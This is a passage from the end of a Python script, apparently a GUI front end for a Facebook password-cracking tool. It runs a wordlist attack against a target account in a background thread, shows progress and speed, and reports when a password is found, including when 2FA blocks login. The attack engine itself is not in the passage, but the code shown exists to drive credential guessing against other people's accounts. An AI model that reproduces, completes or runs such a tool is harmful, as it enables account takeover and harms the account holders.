            if not wordlist or not os.path.exists(wordlist):
                messagebox.showwarning("Warning", "Select valid wordlist!")
                return
            self._run_attack(target, wordlist=wordlist)
    
    def _run_attack(self, target, wordlist=None, single=None):
        """Run attack thread"""
        self.attack_btn.pack_forget()
        self.stop_btn.pack(side=tk.LEFT, padx=(10, 0))
        self.stop_btn.config(state=tk.NORMAL)
        self.progress_var.set(0)
        self.progress_label_var.set("Starting...")
        
        def progress_callback(current, total, pwd, speed, eta):
            percent = (current / total) * 100 if total > 0 else 0
            self.root.after(0, lambda: self.progress_var.set(percent))
            self.root.after(0, lambda: self.progress_label_var.set(
                f"[{current:,}/{total:,}] {pwd[:30]} | {speed:.0f}/s | ETA: {int(eta//60)}m{int(eta%60)}s"))
        
        def run():
            result = self.tester.attack(target, wordlist=wordlist, single=single, progress_callback=progress_callback)
            self.root.after(0, lambda: self.attack_finished(result))
        
        self.attack_thread = threading.Thread(target=run, daemon=True)
        self.attack_thread.start()
    
    def attack_finished(self, result):
        """Attack finished"""
        self.stop_btn.pack_forget()
        self.attack_btn.pack(side=tk.LEFT)
        
        if result is None:
            self.status_var.set("⏹️ Stopped")
        elif result[0] == 'success':
            self.status_var.set(f"✅ Found: {result[1]}")
            messagebox.showinfo("Success!", f"Password Found!\n\nPassword: {result[1]}\nTime: {result[2]:.1f}s\nAttempts: {result[3]:,}")
        elif result[0] == '2fa':
            self.status_var.set(f"⚠️ 2FA: {result[1]}")
            messagebox.showwarning("2FA Detected", f"Password found but 2FA enabled!\n\nPassword: {result[1]}")
        elif result[0] == 'failed':
            self.status_var.set("❌ Not found")
            messagebox.showinfo("Failed", f"Password not found.\nTime: {result[2]:.1f}s\nTested: {result[3]:,}")
    
    def stop_attack(self):
        """Stop attack"""
        if self.tester:
            self.tester.stop()
            self.status_var.set("⏹️ Stopping...")

# ============================================
# MAIN
# ============================================

def main():
    try:
        root = tk.Tk()
        app = FacebookToolGUI(root)
        
        def on_closing():
            if app.tester and app.tester.running:
                app.tester.stop()
            root.destroy()
        
        root.protocol("WM_DELETE_WINDOW", on_closing)
        root.mainloop()
    except Exception as e:
        print(f"Error: {e}")
        traceback.print_exc()
        input("Press Enter to exit...")

if __name__ == '__main__':
    main()
